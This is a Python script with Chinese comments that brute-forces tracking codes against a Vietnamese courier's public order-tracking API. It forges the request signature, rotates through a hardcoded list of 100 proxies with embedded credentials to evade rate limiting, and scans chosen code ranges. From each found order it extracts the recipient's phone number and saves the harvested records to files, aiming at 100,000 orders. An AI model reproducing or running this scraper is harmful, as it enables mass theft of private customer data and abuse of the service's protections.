#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
10万订单扫描脚本 - 基于真实数据分析的密集区域
使用方法：python3 扫描订单.py
"""

import requests
import hashlib
import time
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

# ==================== 100个代理池 ====================
PROXIES = [
    "23.27.184.245:5846:uadkcvtn:uo2rzar814ph",
    "45.43.70.140:6427:uadkcvtn:uo2rzar814ph",
    "82.24.233.117:5439:uadkcvtn:uo2rzar814ph",
    "136.0.188.71:6034:uadkcvtn:uo2rzar814ph",
    "161.123.130.168:5839:uadkcvtn:uo2rzar814ph",
    "142.147.240.52:6574:uadkcvtn:uo2rzar814ph",
    "166.88.224.145:6043:uadkcvtn:uo2rzar814ph",
    "82.25.215.106:5457:uadkcvtn:uo2rzar814ph",
    "91.211.87.215:7205:uadkcvtn:uo2rzar814ph",
    "104.238.36.64:6071:uadkcvtn:uo2rzar814ph",
    "104.239.40.211:6830:uadkcvtn:uo2rzar814ph",
    "67.227.37.26:5568:uadkcvtn:uo2rzar814ph",
    "108.165.218.84:5823:uadkcvtn:uo2rzar814ph",
    "109.196.160.242:5988:uadkcvtn:uo2rzar814ph",
    "104.238.38.204:6472:uadkcvtn:uo2rzar814ph",
    "140.99.203.108:5985:uadkcvtn:uo2rzar814ph",
    "82.25.224.37:7848:uadkcvtn:uo2rzar814ph",
    "216.74.118.50:6205:uadkcvtn:uo2rzar814ph",
    "104.239.13.199:6828:uadkcvtn:uo2rzar814ph",
    "161.123.152.216:6461:uadkcvtn:uo2rzar814ph",
    "185.72.240.218:7254:uadkcvtn:uo2rzar814ph",
    "104.239.43.88:5816:uadkcvtn:uo2rzar814ph",
    "92.113.115.48:5995:uadkcvtn:uo2rzar814ph",
    "145.223.44.64:5747:uadkcvtn:uo2rzar814ph",
    "155.254.34.216:6196:uadkcvtn:uo2rzar814ph",
    "166.88.169.112:6719:uadkcvtn:uo2rzar814ph",
    "82.23.223.60:7904:uadkcvtn:uo2rzar814ph",
    "166.88.235.140:5768:uadkcvtn:uo2rzar814ph",
    "23.129.252.17:6285:uadkcvtn:uo2rzar814ph",
    "46.203.134.90:5714:uadkcvtn:uo2rzar814ph",
    "82.23.227.49:7352:uadkcvtn:uo2rzar814ph",
    "104.239.13.114:6743:uadkcvtn:uo2rzar814ph",
    "50.114.98.129:5613:uadkcvtn:uo2rzar814ph",
    "154.6.83.144:6615:uadkcvtn:uo2rzar814ph",
    "45.38.86.229:6158:uadkcvtn:uo2rzar814ph",
    "64.137.73.19:5107:uadkcvtn:uo2rzar814ph",
    "45.131.101.19:6286:uadkcvtn:uo2rzar814ph",
    "104.239.40.197:6816:uadkcvtn:uo2rzar814ph",
    "82.21.209.226:6555:uadkcvtn:uo2rzar814ph",
    "23.26.71.157:5640:uadkcvtn:uo2rzar814ph",
    "23.27.91.75:6154:uadkcvtn:uo2rzar814ph",
    "23.95.150.72:6041:uadkcvtn:uo2rzar814ph",
    "82.26.218.128:6436:uadkcvtn:uo2rzar814ph",
    "91.223.126.118:6730:uadkcvtn:uo2rzar814ph",
    "145.223.44.177:5860:uadkcvtn:uo2rzar814ph",
    "45.38.94.42:5963:uadkcvtn:uo2rzar814ph",
    "23.26.95.215:5697:uadkcvtn:uo2rzar814ph",
    "50.114.15.8:5993:uadkcvtn:uo2rzar814ph",
    "82.24.217.113:5443:uadkcvtn:uo2rzar814ph",
    "136.0.109.46:6332:uadkcvtn:uo2rzar814ph",
    "185.101.253.194:5754:uadkcvtn:uo2rzar814ph",
    "38.153.133.31:9435:uadkcvtn:uo2rzar814ph",
    "108.165.161.42:5783:uadkcvtn:uo2rzar814ph",
    "2.57.31.80:6656:uadkcvtn:uo2rzar814ph",
    "45.56.173.242:6225:uadkcvtn:uo2rzar814ph",
    "216.173.104.22:6159:uadkcvtn:uo2rzar814ph",
    "216.173.123.97:6472:uadkcvtn:uo2rzar814ph",
    "104.253.55.119:5549:uadkcvtn:uo2rzar814ph",
    "91.211.87.2:6992:uadkcvtn:uo2rzar814ph",
    "142.111.44.203:5915:uadkcvtn:uo2rzar814ph",
    "191.101.174.88:6136:uadkcvtn:uo2rzar814ph",
    "31.58.26.144:6727:uadkcvtn:uo2rzar814ph",
    "104.232.211.81:5694:uadkcvtn:uo2rzar814ph",
    "104.253.48.76:5500:uadkcvtn:uo2rzar814ph",
    "154.36.85.89:6600:uadkcvtn:uo2rzar814ph",
    "140.99.202.10:5888:uadkcvtn:uo2rzar814ph",
    "45.41.169.227:6888:uadkcvtn:uo2rzar814ph",
    "45.67.0.158:6594:uadkcvtn:uo2rzar814ph",
    "45.150.176.51:5924:uadkcvtn:uo2rzar814ph",
    "104.238.7.43:5970:uadkcvtn:uo2rzar814ph",
    "216.173.75.47:6348:uadkcvtn:uo2rzar814ph",
    "45.39.5.58:6496:uadkcvtn:uo2rzar814ph",
    "46.203.157.176:7119:uadkcvtn:uo2rzar814ph",
    "104.233.20.17:6033:uadkcvtn:uo2rzar814ph",
    "216.74.114.235:6518:uadkcvtn:uo2rzar814ph",
    "142.202.254.167:6145:uadkcvtn:uo2rzar814ph",
    "37.44.219.236:6201:uadkcvtn:uo2rzar814ph",
    "82.24.239.176:7033:uadkcvtn:uo2rzar814ph",
    "104.239.19.194:6871:uadkcvtn:uo2rzar814ph",
    "191.101.181.187:6940:uadkcvtn:uo2rzar814ph",
    "38.154.199.233:5387:uadkcvtn:uo2rzar814ph",
    "45.39.18.128:6564:uadkcvtn:uo2rzar814ph",
    "103.47.53.151:8449:uadkcvtn:uo2rzar814ph",
    "45.39.17.119:5542:uadkcvtn:uo2rzar814ph",
    "216.173.75.226:6527:uadkcvtn:uo2rzar814ph",
    "45.56.175.4:5678:uadkcvtn:uo2rzar814ph",
    "64.137.89.84:6157:uadkcvtn:uo2rzar814ph",
    "82.21.248.115:6451:uadkcvtn:uo2rzar814ph",
    "198.46.241.44:6579:uadkcvtn:uo2rzar814ph",
    "45.83.57.20:6537:uadkcvtn:uo2rzar814ph",
    "104.239.41.168:6523:uadkcvtn:uo2rzar814ph",
    "64.137.77.92:5527:uadkcvtn:uo2rzar814ph",
    "104.253.82.58:6479:uadkcvtn:uo2rzar814ph",
    "82.23.223.166:8010:uadkcvtn:uo2rzar814ph",
    "185.15.178.90:5774:uadkcvtn:uo2rzar814ph",
    "209.127.191.113:5187:uadkcvtn:uo2rzar814ph",
    "191.101.174.78:6126:uadkcvtn:uo2rzar814ph",
    "217.69.127.152:6773:uadkcvtn:uo2rzar814ph",
    "38.225.2.55:5838:uadkcvtn:uo2rzar814ph",
    "92.112.136.179:6123:uadkcvtn:uo2rzar814ph",
]

# ==================== 配置参数 ====================
CONFIG = {
    'target': 10,               # 目标：10个订单（测试用，可改成100、1000、100000）
    'total_threads': 3,         # 并发线程数（测试用3个，正式可改成20-50）
    'delay': 0.2,               # 请求间隔（秒）
    'timeout': 15,              # 超时时间（秒）
    'save_every': 5,            # 每找到多少个订单保存一次
    'max_98_retries': 10,       # Code:98 最大重试次数
    'proxy_fail_threshold': 3,  # 代理失败几次就禁用
}

# ==================== 密集区域（基于真实数据分析）====================
DENSE_REGIONS = [
    # EB 区域（5.0%占比）
    {'prefix': 'EB', 'start': 102885483, 'end': 102885894, 'priority': 1, 'step': 1, 'name': 'EB_超密1'},
    {'prefix': 'EB', 'start': 102888238, 'end': 102890364, 'priority': 1, 'step': 1, 'name': 'EB_超密2'},
    {'prefix': 'EB', 'start': 102964844, 'end': 102969325, 'priority': 1, 'step': 1, 'name': 'EB_超密3'},
    
    # EC 区域（密度8.6%！）
    {'prefix': 'EC', 'start': 149780335, 'end': 149780809, 'priority': 1, 'step': 1, 'name': 'EC_COD超密'},
    {'prefix': 'EC', 'start': 143587127, 'end': 143588309, 'priority': 1, 'step': 1, 'name': 'EC_扩展1'},
    
    # ED 区域
    {'prefix': 'ED', 'start': 121962191, 'end': 121962245, 'priority': 1, 'step': 1, 'name': 'ED_密集1'},
    
    # EF 区域（78.5%占比，941个订单！重点扫描）
    {'prefix': 'EF', 'start': 43571075, 'end': 43571359, 'priority': 1, 'step': 1, 'name': 'EF_超密1'},
    {'prefix': 'EF', 'start': 43571495, 'end': 43576271, 'priority': 1, 'step': 1, 'name': 'EF_超密2'},
    {'prefix': 'EF', 'start': 43579295, 'end': 43582396, 'priority': 1, 'step': 1, 'name': 'EF_超密3'},
    {'prefix': 'EF', 'start': 43590790, 'end': 43591680, 'priority': 1, 'step': 1, 'name': 'EF_超密4'},
    {'prefix': 'EF', 'start': 43592040, 'end': 43595735, 'priority': 1, 'step': 1, 'name': 'EF_超密5'},
    {'prefix': 'EF', 'start': 45405059, 'end': 45405093, 'priority': 1, 'step': 1, 'name': 'EF_密集6'},
    {'prefix': 'EF', 'start': 45746336, 'end': 45746469, 'priority': 1, 'step': 1, 'name': 'EF_密集7'},
    {'prefix': 'EF', 'start': 47519990, 'end': 47523345, 'priority': 1, 'step': 1, 'name': 'EF_超密8'},
    {'prefix': 'EF', 'start': 47544901, 'end': 47557176, 'priority': 1, 'step': 1, 'name': 'EF_超密9'},
    {'prefix': 'EF', 'start': 47681054, 'end': 47685970, 'priority': 1, 'step': 1, 'name': 'EF_超密10'},
    {'prefix': 'EF', 'start': 47747087, 'end': 47747436, 'priority': 1, 'step': 1, 'name': 'EF_密集11'},
    
    # EG 区域
    {'prefix': 'EG', 'start': 40816534, 'end': 40816548, 'priority': 1, 'step': 1, 'name': 'EG_密集1'},
    {'prefix': 'EG', 'start': 40836088, 'end': 40836105, 'priority': 1, 'step': 1, 'name': 'EG_密集2'},
    {'prefix': 'EG', 'start': 40840745, 'end': 40841009, 'priority': 1, 'step': 1, 'name': 'EG_密集3'},
    {'prefix': 'EG', 'start': 46007274, 'end': 46007504, 'priority': 1, 'step': 1, 'name': 'EG_密集4'},
    {'prefix': 'EG', 'start': 47361262, 'end': 47361302, 'priority': 1, 'step': 1, 'name': 'EG_密集5'},
    
    # EJ 区域
    {'prefix': 'EJ', 'start': 701368250, 'end': 701369958, 'priority': 1, 'step': 1, 'name': 'EJ_密集1'},
    {'prefix': 'EJ', 'start': 701441480, 'end': 701443843, 'priority': 1, 'step': 1, 'name': 'EJ_密集2'},
    {'prefix': 'EJ', 'start': 711462436, 'end': 711463431, 'priority': 1, 'step': 1, 'name': 'EJ_密集3'},
    
    # EK 区域
    {'prefix': 'EK', 'start': 42151562, 'end': 42151580, 'priority': 1, 'step': 1, 'name': 'EK_密集1'},
    {'prefix': 'EK', 'start': 42227544, 'end': 42228227, 'priority': 1, 'step': 1, 'name': 'EK_密集2'},
    
    # EL 区域
    {'prefix': 'EL', 'start': 135247577, 'end': 135252002, 'priority': 1, 'step': 1, 'name': 'EL_密集1'},
    {'prefix': 'EL', 'start': 135726003, 'end': 135756504, 'priority': 1, 'step': 1, 'name': 'EL_密集2'},
    {'prefix': 'EL', 'start': 155309426, 'end': 155309491, 'priority': 1, 'step': 1, 'name': 'EL_密集3'},
]

# ==================== 全局状态 ====================
state = {
    'found': 0,
    'tested': 0,
    'errors': 0,
    'start_time': time.time(),
    'orders': [],
    'lock': Lock(),
}

# ==================== 代理池管理 ====================
class ProxyPool:
    def __init__(self, proxies):
        self.proxies = []
        self.failed_count = {}
        self.current_index = 0
        self.lock = Lock()
        
        for proxy_str in proxies:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                ip, port, user, password = parts
                self.proxies.append({
                    'ip': ip,
                    'port': port,
                    'enabled': True,
                    'proxy_str': f'http://{user}:{password}@{ip}:{port}'
                })
                self.failed_count[proxy_str] = 0
    
    def get_next_proxy(self):
        with self.lock:
            attempts = 0
            while attempts < len(self.proxies):
                proxy = self.proxies[self.current_index]
                self.current_index = (self.current_index + 1) % len(self.proxies)
                
                if proxy['enabled']:
                    return {
                        'http': proxy['proxy_str'],
                        'https': proxy['proxy_str']
                    }, f"{proxy['ip']}:{proxy['port']}"
                
                attempts += 1
            
            return None, None
    
    def mark_failure(self, proxy_display):
        with self.lock:
            for proxy in self.proxies:
                if f"{proxy['ip']}:{proxy['port']}" == proxy_display:
                    key = f"{proxy['ip']}:{proxy['port']}"
                    self.failed_count[key] = self.failed_count.get(key, 0) + 1
                    
                    if self.failed_count[key] >= CONFIG['proxy_fail_threshold']:
                        proxy['enabled'] = False
                        print(f"⚠️  代理 {proxy_display} 已禁用")
                    break

proxy_pool = ProxyPool(PROXIES)

# ==================== 查询订单 ====================
def query_order(code, proxy_dict, proxy_display):
    url = "https://donhang.ghn.vn/api/v1/public/tracking/search"
    signature_str = f"code={code}&source=tracking_page"
    signature = hashlib.md5(signature_str.encode()).hexdigest()
    
    payload = {"code": code, "signature": signature, "source": "tracking_page"}
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    for attempt in range(CONFIG['max_98_retries']):
        try:
            response = requests.post(url, json=payload, headers=headers, proxies=proxy_dict, timeout=CONFIG['timeout'])
            data = response.json()
            code_value = data.get('Code', 0)
            
            if code_value == 98:
                print(f"98..", end='', flush=True)
                proxy_pool.mark_failure(proxy_display)
                time.sleep(0.3)
                proxy_dict, proxy_display = proxy_pool.get_next_proxy()
                if not proxy_dict:
                    return None, "NO_PROXY"
                continue
            
            if code_value == 1:
                return data.get('Data'), "SUCCESS"
            else:
                return None, f"Code:{code_value}"
                
        except:
            return None, "ERROR"
    
    return None, "MAX_98_RETRY"

# ==================== 扫描区域 ====================
def scan_region(region):
    prefix = region['prefix']
    start = region['start']
    end = region['end']
    step = region['step']
    name = region['name']
    
    print(f"\n🔍 开始扫描 [{name}] {prefix}{start:09d}-{prefix}{end:09d}")
    
    for num in range(start, end + 1, step):
        if state['found'] >= CONFIG['target']:
            break
        
        code = f"{prefix}{num:09d}VN"
        proxy_dict, proxy_display = proxy_pool.get_next_proxy()
        if not proxy_dict:
            print(f"\n❌ 无可用代理！")
            break
        
        data, status = query_order(code, proxy_dict, proxy_display)
        
        with state['lock']:
            state['tested'] += 1
        
        if status == "SUCCESS" and data:
            phone = "N/A"
            if 'OrderInfo' in data:
                for item in data['OrderInfo']:
                    if item.get('Key') == 'Người nhận':
                        value = item.get('Value', '')
                        phone_match = re.search(r'\d{10,11}', value)
                        if phone_match:
                            phone = phone_match.group()
                        break
            
            with state['lock']:
                state['found'] += 1
                state['orders'].append({'code': code, 'phone': phone, 'data': data})
                
                elapsed = time.time() - state['start_time']
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                rate = (state['found'] / state['tested'] * 100) if state['tested'] > 0 else 0
                
                print(f"\n✅ [{state['found']}/{CONFIG['target']}] {code} | 📞 {phone} | ⚡ {speed:.1f}/s | 成功率:{rate:.2f}%")
                
                if state['found'] % CONFIG['save_every'] == 0:
                    save_progress()
        
        time.sleep(CONFIG['delay'])

# ==================== 保存进度 ====================
def save_progress():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    json_file = f"orders_{timestamp}.json"
    txt_file = f"orders_{timestamp}.txt"
    
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump({'total_found': state['found'], 'orders': state['orders']}, f, ensure_ascii=False, indent=2)
    
    with open(txt_file, 'w', encoding='utf-8') as f:
        for order in state['orders']:
            f.write(f"{order['code']}\t{order['phone']}\n")
    
    print(f"\n💾 已保存 {state['found']} 个订单")

# ==================== 主程序 ====================
def main():
    print("="*80)
    print("🚀 10万订单扫描系统")
    print("="*80)
    print(f"📊 代理池: {len(PROXIES)} 个 | 线程: {CONFIG['total_threads']} | 目标: {CONFIG['target']:,}")
    print(f"📊 密集区域: {len(DENSE_REGIONS)} 个 | Code:98重试: {CONFIG['max_98_retries']} 次")
    print("="*80)
    print("开始初始化...")
    
    with ThreadPoolExecutor(max_workers=CONFIG['total_threads']) as executor:
        futures = []
        for region in sorted(DENSE_REGIONS, key=lambda x: x.get('priority', 1)):
            if state['found'] >= CONFIG['target']:
                break
            futures.append(executor.submit(scan_region, region))
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"❌ 异常: {e}")
    
    save_progress()
    
    elapsed = time.time() - state['start_time']
    print("\n" + "="*80)
    print("📊 扫描完成！")
    print("="*80)
    print(f"✅ 找到订单: {state['found']:,}")
    print(f"🔍 已测试: {state['tested']:,}")
    print(f"⚡ 成功率: {state['found']/state['tested']*100:.2f}%" if state['tested'] > 0 else "0%")
    print(f"⏱️  总耗时: {elapsed/60:.1f} 分钟")
    print(f"🚀 速度: {state['tested']/elapsed:.1f} 次/秒")
    print("="*80)

if __name__ == "__main__":
    main()
